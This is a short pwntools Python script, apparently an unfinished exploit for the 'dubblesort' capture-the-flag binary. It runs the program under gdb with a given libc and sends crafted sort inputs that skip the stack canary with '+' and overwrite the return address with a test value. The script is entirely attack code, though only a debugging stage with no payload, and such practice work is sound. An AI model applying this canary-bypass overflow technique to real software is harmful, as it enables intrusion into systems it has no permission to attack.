import os
from pwn import *

libc = ELF('libc_32.so.6')
dubblesort = ELF('dubblesort')


CANARY_OFFSET = 0x16
RET_OFFSET = 0x20


class Prompts:
    NAME = 'name :'
    NUMS_COUNT = 'sort :'
    NUM = 'number : '


p = gdb.debug(
    dubblesort.path,
    '''
    b *main+0xf0
    b *main+0x13b
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)


def main():
    num_count = 33
    p.sendlineafter(Prompts.NAME, 'egk')
    p.sendlineafter(Prompts.NUMS_COUNT, str(num_count))
    for i in range(num_count):
        if i == RET_OFFSET:
            p.sendlineafter(Prompts.NUM, str(0xffffffff))
        elif i >= CANARY_OFFSET:
            p.sendlineafter(Prompts.NUM, '+')
        else:
            p.sendlineafter(Prompts.NUM, str(i))


if __name__ == "__main__":
    main()
